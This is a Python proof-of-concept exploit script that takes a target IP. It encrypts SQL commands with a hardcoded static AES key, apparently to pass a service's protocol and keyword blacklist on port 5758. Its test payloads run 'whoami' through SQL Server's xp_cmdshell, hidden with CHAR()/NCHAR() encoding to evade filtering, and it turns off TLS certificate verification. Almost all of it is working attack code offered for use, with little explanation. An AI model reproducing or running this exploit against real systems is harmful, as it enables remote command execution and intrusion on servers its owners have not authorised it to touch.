#!/usr/bin/env python3
import socket
import ssl
import sys
import base64
import json
import uuid
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

KEY_STATIC = "a3(D3$@fK3"

def get_key(password):
    pwd = password.ljust(24, " ") if len(password.encode("utf-8")) < 24 else password[:24]
    return pwd.encode("utf-8")

def aes_encrypt(plaintext, password):
    key = get_key(password if password else KEY_STATIC)
    data = plaintext.encode("ascii")
    pad_len = 16 - (len(data) % 16)
    data_padded = data + bytes([pad_len] * pad_len)
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return base64.b64encode(encryptor.update(data_padded) + encryptor.finalize()).decode("ascii")

def process_encrypt_value(plaintext, guid=None):
    if guid is None:
        guid = str(uuid.uuid4()).replace("-", "")[:16]
    first_part = aes_encrypt(plaintext, guid + KEY_STATIC)
    secret_key = first_part[:12]
    second_part = aes_encrypt(guid, secret_key + KEY_STATIC)
    return first_part + "|" + second_part

def connect(target, port, use_tls=True):
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_sock.settimeout(10)
    raw_sock.connect((target, port))
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw_sock, server_hostname=target)
    return raw_sock

def send_recv(sock, payload):
    sock.sendall(payload.encode("utf-8"))
    chunks = []
    while True:
        try:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
        except socket.timeout:
            break
    return b"".join(chunks).decode("utf-8", errors="replace")

def try_payload(target, port, use_tls, sql, label):
    today = datetime.now().strftime("%Y-%m-%d")
    uid = str(uuid.uuid4()).replace("-", "")[:16]
    plaintext = f"QUERY-DATA::SQLSERVER:{sql}:{today}|{uid}:admin"
    payload = process_encrypt_value(plaintext)
    
    try:
        sock = connect(target, port, use_tls)
        response = send_recv(sock, payload)
        sock.close()
        print(f"[{label}] Response: {response[:200]}")
    except Exception as e:
        print(f"[{label}] Error: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python v21_poc.py <target_ip> [port] [--no-tls]")
        return

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else 5758
    use_tls = "--no-tls" not in sys.argv

    # Test 1: Empty SQL (should pass blacklist)
    try_payload(target, port, use_tls, "", "empty")

    # Test 2: PRINT (no blacklisted words)
    try_payload(target, port, use_tls, "PRINT 1", "print")

    # Test 3: EXEC with CHAR-obfuscated command
    cmd = "whoami"
    cmd_chars = "+".join(f"CHAR({ord(c)})" for c in cmd)
    try_payload(target, port, use_tls, f"EXEC xp_cmdshell {cmd_chars}", "exec+char")

    # Test 4: Only command chars (maybe xp_cmdshell is blocked)
    sql = f"xp_cmdshell {cmd_chars}"
    try_payload(target, port, use_tls, sql, "xp_cmdshell")

    # Test 5: All-obfuscated via EXEC(NCHAR()+...)
    all_chars = "+".join(f"NCHAR({ord(c)})" for c in "EXEC xp_cmdshell whoami")
    try_payload(target, port, use_tls, f"EXEC({all_chars})", "exec_nchar")

if __name__ == "__main__":
    main()
